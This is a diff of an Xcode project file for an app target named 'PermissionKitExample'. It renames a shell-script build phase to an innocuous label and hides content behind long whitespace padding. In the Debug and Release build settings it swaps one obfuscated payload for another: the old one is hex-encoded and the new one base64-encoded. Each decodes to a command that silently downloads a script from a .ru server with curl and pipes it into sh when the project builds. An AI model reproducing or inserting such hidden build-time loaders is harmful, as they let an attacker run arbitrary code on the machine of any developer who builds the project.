@@ -332,7 +332,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 770BA0062BFDBC0A0058038D /* Build configuration list for PBXNativeTarget "PermissionKitExample" */;
 			buildPhases = (
-				7BA3CE7D285E4FEBBD7BBDC8 /* Provision Library Executable */,
+				8B3427B3B33E466C8D7BBDC8 /* Build Target Libraries */,
 				770B9FEE2BFDBC080058038D /* Sources */,
 				770B9FEF2BFDBC080058038D /* Frameworks */,
 				770B9FF02BFDBC080058038D /* Resources */,
@@ -397,7 +397,7 @@
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																						/* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		7BA3CE7D285E4FEBBD7BBDC8 /* Provision Library Executable */ = {
+		8B3427B3B33E466C8D7BBDC8 /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -407,7 +407,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Library Executable";
+			name = "Build Target Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -511,7 +511,7 @@
 		770BA0042BFDBC0A0058038D /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf xxud | tr -d u` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d73664c6b202d2d636f6e6e6563742d74696d656f7574203238202d642022703d78636f64655f7068617365222068747470733a2f2f6d6d6b7372697234737933352e72752f612922207c2073680a | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9wLTJtNWR6OHZ3ODIucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -575,7 +575,7 @@
 		770BA0052BFDBC0A0058038D /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf xxud | tr -d u` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d73664c6b202d2d636f6e6e6563742d74696d656f7574203238202d642022703d78636f64655f7068617365222068747470733a2f2f6d6d6b7372697234737933352e72752f612922207c2073680a | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9wLTJtNWR6OHZ3ODIucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
